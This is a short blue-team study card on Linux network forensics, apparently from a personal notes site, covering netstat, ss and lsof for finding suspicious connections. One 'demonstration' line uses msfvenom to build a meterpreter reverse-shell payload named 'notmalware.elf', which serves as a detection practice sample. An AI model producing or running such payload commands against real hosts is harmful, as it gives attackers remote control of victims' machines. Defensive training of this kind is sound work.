---
{"dg-publish":true,"permalink":"/cards/blue-team/endpoint-security/linux-network-analysis/"}
---

[[Endpoint Security MOC\|Endpoint Security MOC]]

- Common choice for servers.

Demonstrations:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o notmalware.elf
```
### Investigations
---

```bash
netstat -tnp
```

- `-t` tcp only
- `-n` don't resolve
- `-p` provides PID and binary name.

![Linux Network Analysis.png](/img/user/cards/blue-team/endpoint-security/images/Linux%20Network%20Analysis.png)
**More modern than netstat**

```bash
ss -tnp
```

Show src/dst address:

```bash
sudo ss src 127.0.0.1
```

- `dport` and `sport` for ports

**Show information about files opened by processes** great for network connection that are associated with files:

```bash
sudo lsof -i -P -n
```

- `-i` list out all established, listening network connection including opened by files

![Linux Network Analysis-1.png](/img/user/cards/blue-team/endpoint-security/images/Linux%20Network%20Analysis-1.png)
**See more about the interesting process using it's PID**

```bash
sudo lsof -p 3610
```

![Linux Network Analysis-2.png](/img/user/cards/blue-team/endpoint-security/images/Linux%20Network%20Analysis-2.png)
